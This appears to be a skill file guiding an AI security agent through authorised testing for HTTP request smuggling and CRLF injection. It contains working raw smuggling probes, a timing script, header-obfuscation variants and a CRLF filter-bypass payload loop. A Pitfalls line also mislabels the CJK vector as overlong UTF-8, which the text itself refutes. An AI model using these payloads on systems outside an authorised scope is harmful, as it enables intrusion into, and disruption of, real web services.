---
name: zp-smuggling
description: ZeroProtocol hunter for HTTP request smuggling and desync, including CL.TE, TE.CL, TE.TE, H2.CL, H2.TE, CRLF header injection and request tunnelling. Use when a CDN or reverse proxy sits in front of the app (cf-ray, via, x-cache, akamai, awselb), when testing for desync, when a header value reflects into the response, or when hunting HTTP/2 downgrade issues. Uses timing-based detection only, never the socket-poisoning confirmation that damages other users' requests.
---

# zp-smuggling - disagreement between two servers

**Phase:** 5 | **Gate:** **active.** `zp-scope check <target>` must exit 0. Exit 1 refuse ·
3 stop · 4 stop.

**Read this before the first probe.** The textbook confirmation for smuggling works by leaving
a partial request on a shared connection so that the *next* visitor's request gets your prefix
attached. On a production target that next visitor is a real customer: their request is
corrupted, their response may go to you, or their session data may land in your reply.

So ZeroProtocol confirms smuggling by **timing differentials only**, and reports the desync as
the finding. Never run a socket-poisoning PoC against a live target. If a program explicitly
wants poisoning proof, get that in writing and let a human do it in a maintenance window.

---

## Procedure

**1. Is there even a front end?** Smuggling needs two servers that can disagree.

```bash
curl -skI "https://$H/" | grep -iE 'via|x-cache|cf-ray|x-served-by|x-akamai|server|x-amz-cf-id|x-varnish|x-envoy'
```

No proxy, no smuggling. Also note the HTTP version: `curl -sI --http2 -w '%{http_version}\n'`.

**2. Timing detection - CL.TE.** The front end uses `Content-Length`, the back end uses
`Transfer-Encoding`. The back end waits for a chunk that never comes.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

The front end forwards 4 bytes; the back end reads chunk `1`/`A`, then waits for the next chunk
header. **A delay of ~5-10s that a control request does not show is the signal.**

**3. Timing detection - TE.CL.** The reverse: front end honours `Transfer-Encoding`, back end
honours `Content-Length`.

```
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

The back end waits for the body promised by `Content-Length`. Same signal: a hang.

**4. Send them properly.** `curl` normalises these headers, so use a raw socket.

```bash
python3 - "$H" <<'PY'
import socket, ssl, sys, time
host = sys.argv[1]
def probe(name, raw, expect_hang):
    s = ssl.create_default_context()
    s.check_hostname = False; s.verify_mode = ssl.CERT_NONE
    c = s.wrap_socket(socket.create_connection((host, 443), timeout=15), server_hostname=host)
    t = time.time(); c.sendall(raw.replace("\n", "\r\n").encode())
    try:
        c.settimeout(12); c.recv(4096)
    except Exception:
        pass
    el = time.time() - t; c.close()
    print(f"{name:10s} {el:5.2f}s  {'<-- DELAY' if el > 5 else ''}")
    return el

control = f"POST / HTTP/1.1\nHost: {host}\nContent-Length: 0\n\n"
clte    = f"POST / HTTP/1.1\nHost: {host}\nContent-Length: 4\nTransfer-Encoding: chunked\n\n1\nA\nX"
tecl    = f"POST / HTTP/1.1\nHost: {host}\nContent-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nX"
for n, r in (("control", control), ("CL.TE", clte), ("TE.CL", tecl), ("control2", control)):
    probe(n, r, False); time.sleep(1)
PY
```

Run it several times. A single slow request is network noise; a delay that reproduces on the
smuggling probe and never on the control is the finding.

**5. TE.TE - obfuscate the header so exactly one server stops seeing it.**

```
Transfer-Encoding: xchunked            Transfer-Encoding : chunked
Transfer-Encoding: chunked             Transfer-Encoding: chunked
 Transfer-Encoding: chunked            X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding:[tab]chunked         Transfer-Encoding: "chunked"
Transfer-encoding: chunked, identity   Transfer-Encoding: CHUNKED
```

**6. HTTP/2 specific - the modern variants, and the ones most often unpatched.**

```
H2.CL    HTTP/2 request carrying content-length that disagrees with the real body length
H2.TE    HTTP/2 request carrying transfer-encoding: chunked (illegal in h2, sometimes forwarded)
CRLF in h2 header values   a header value containing \r\n splits into new headers on downgrade
h2 :path / :method smuggling  control characters in pseudo-headers
```

HTTP/2 downgrade is where most current findings live: the front end speaks h2 to you and
HTTP/1.1 to the back end, and it rebuilds the request faithfully enough to carry your CRLF.

**7. CRLF header injection** - the same root cause, a cleaner and safer proof.

```bash
for par in next returnTo url redirect callback continue dest lang; do
  for vec in '%0d%0aX-ZP-Injected:%2091234' '%0aX-ZP-Injected:%2091234' \
             '%E5%98%8A%E5%98%8DX-ZP-Injected:%2091234'; do
    curl -skI "https://$H/?$par=$vec" | grep -i 'x-zp-injected' && echo "  ^ via $par / $vec"
  done
done
```

An injected header appearing in the response is a confirmed CRLF injection - reportable on its
own, and it needs no desync and harms nobody.

The third vector bypasses filters that only look for `%0d%0a`, and it is worth naming its
mechanism correctly because the report depends on it. `%E5%98%8A%E5%98%8D` is **valid, minimal
UTF-8** for U+560A and U+560D (the CJK characters 嘊 and 嘍) - it is *not* an overlong encoding
of CR/LF. It works when something downstream applies a Unicode **best-fit / normalization fold**
that collapses those code points to ASCII `\r` and `\n`. Call it a best-fit CRLF fold in the
report: a vendor told "overlong UTF-8" will go and check whether their UTF-8 decoder accepts
non-minimal sequences, which is the wrong control and will not fix this.

(A genuine overlong encoding of CRLF would be `%E0%80%8D%E0%80%8A`. The overlong trick does show
up legitimately elsewhere - `..%c0%af` in `zp-xxe-lfi` really is an overlong encoding of `/`.)

**8. Request tunnelling.** When the front end pins one connection per client, a desync can leak
only into *your own* subsequent requests. That is much safer to demonstrate - if you can show
your second request receiving the smuggled prefix's response on your own connection, you have
proof without touching anyone else.

---

## Confirm or kill

| Evidence | Verdict |
|---|---|
| reproducible delay on CL.TE/TE.CL, never on the control | **confirmed desync.** High to Critical. Report with the timing data |
| injected header appears in the response | **confirmed CRLF header injection.** Medium to High |
| a single slow response | not confirmed. Repeat with controls |
| delay on both probe and control | the server is just slow, or you are rate limited |
| `400 Bad Request` on the TE probe | the front end is rejecting it - that is correct behaviour. Killed |
| `501 Unimplemented` on `Transfer-Encoding` | the back end refuses chunked. Killed |
| desync reproduces only in your own connection (tunnelling) | confirmed, and the safe form to demonstrate |
| h2 CRLF splits into a real header | confirmed h2 downgrade issue. High |
| no proxy headers at all | killed - there is nothing to desync |

**Timing is noisy.** Require the probe to hang and both controls (before and after) to be fast,
across at least three runs, before you write anything.

---

## High-value patterns

- **HTTP/2 downgrade** at a CDN in front of an older origin - the most productive variant today.
- **CRLF injection in a redirect parameter** - low risk to prove, and it chains into cache poisoning and session fixation.
- **A desync reaching an internal-only route** (`/admin`, an internal header-authenticated path) - that is authorization bypass.
- **Smuggling past a WAF** - the front end inspects your benign request, the back end sees the smuggled one.
- **Header injection that sets a cookie** - session fixation on other users.
- **A CDN that caches the poisoned response** -> `zp-cache-poison`; together they are a much bigger report.

---

## Pitfalls

- **Running a socket-poisoning PoC on production.** The central rule of this skill. You corrupt real users' requests.
- **Using `curl` for the raw probes.** It normalises the headers and your test proves nothing.
- **One timing sample.** Always bracket with controls, always repeat.
- **Testing at high concurrency.** Desync probes tie up connections; a burst looks like an attack on availability.
- **Reporting a slow endpoint as a desync.**
- **Forgetting the overlong-UTF8 CRLF variant** and concluding the filter holds.
- **Missing that the target is HTTP/2-only** to the edge - then the h2 variants are the only ones that apply.
- **Chasing smuggling with no front end** in the headers.

---

## Hand off to

Confirmed -> `zp-triage`, `zp-report`, with the timing table as evidence.
Cacheable poisoned response -> `zp-cache-poison`. Reaching an internal route -> `zp-authz`.
Cookie set via header injection -> `zp-jwt-oauth` for the session impact.
Reflected header values -> `zp-xss` if they land in a rendered body.
